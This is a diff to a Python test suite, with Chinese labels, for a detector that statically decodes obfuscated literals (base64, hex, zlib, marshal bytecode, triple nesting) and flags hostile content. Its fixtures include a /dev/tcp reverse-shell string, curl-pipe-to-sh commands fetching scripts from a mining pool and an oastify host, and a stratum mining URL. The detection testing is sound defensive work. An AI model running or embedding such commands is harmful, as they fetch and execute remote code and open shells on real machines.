@@ -81,7 +81,7 @@ check("module_level 缺失时回落文件名",
 print("[3] 单层解码")
 b64 = base64.b64encode(b'subprocess.Popen("/dev/tcp/1.2.3.4/4444")').decode()
 hits = decode_literal(b64)
-check("base64 解码成功", any(h['method'] == 'base64' for h in hits),
+check("base64 解码成功", any(h['method'].startswith('base64') for h in hits),
       detail=str(hits[:1]))
 check("解出内容命中敌意特征",
       any(decoded_has_risk(h['decoded']) for h in hits))
@@ -90,13 +90,13 @@ check("解出内容保留原文",
 
 hexs = b'os.system("curl http://pool.supportxmr.com/x.sh|sh")'.hex()
 h2 = decode_literal(hexs)
-check("hex 解码", any(h['method'] == 'hex' for h in h2), detail=str(h2[:1]))
+check("hex 解码", any(h['method'].startswith('hex') for h in h2), detail=str(h2[:1]))
 
 # 嵌套：zlib 压缩后再 base64
 inner = b"stratum+tcp://pool.supportxmr.com:3333"
 zl = base64.b64encode(zlib.compress(inner)).decode()
 h3 = decode_literal(zl)
-check("base64 内层可解", any('stratum' in h['decoded'] for h in h3),
+check("base64+zlib 可解", any('stratum' in h['decoded'] for h in h3),
       detail=str(h3[:2]))
 
 # 反例
@@ -121,6 +121,33 @@ check("编码载荷的链通过敌意字面量门",
 NODES2 = [{'node_id': 'n2', 'code': 'x = compute(3)', 'file': '/x/a.py', 'line': 2}]
 check("普通代码不通过",
       any_hostile_literal([{'nodes': ['n2']}], NODES2) is False)
+
+print("[6] 超级混淆（marshal 字节码 / 多层嵌套）")
+import marshal as _m
+_src = 'import os' + chr(10) + 'os.system("curl http://x.oastify.com/p | sh")' + chr(10)
+_mb64 = base64.b64encode(_m.dumps(compile(_src, '<p>', 'exec'))).decode()
+_h = decode_literal(_mb64)
+check("marshal 字节码被静态解析（不执行）",
+      any(h['method'].startswith('marshal') for h in _h),
+      detail=str([x['method'] for x in _h]))
+check("marshal 载荷字符串被取出",
+      any('oastify' in h['decoded'] for h in _h), detail=str(_h[:2]))
+check("marshal 里的 API 名被取出",
+      any('system' in h['decoded'] for h in _h))
+# 三层嵌套
+_l = b'os.system("curl http://pool.supportxmr.com/x")'
+for _ in range(3):
+    _l = base64.b64encode(zlib.compress(_l))
+_h3 = decode_literal(_l.decode())
+check("三层嵌套全部剥开",
+      any('supportxmr' in h['decoded'] for h in _h3),
+      detail=str([(x['method'], x['decoded'][:20]) for x in _h3]))
+# 良性对照：二进制不得产生伪文本
+_img = base64.b64encode(bytes(range(256)) * 4).decode()
+check("良性二进制不产生伪解出", decode_literal(_img) == [],
+      detail=str(decode_literal(_img)[:1]))
+_okjson = base64.b64encode(b'{"name":"requests","version":"2.31"}').decode()
+check("良性 JSON 正常解出", len(decode_literal(_okjson)) >= 1)
 
 print()
 print(f"引擎合并+解码: PASS={PASS} FAIL={FAIL}")
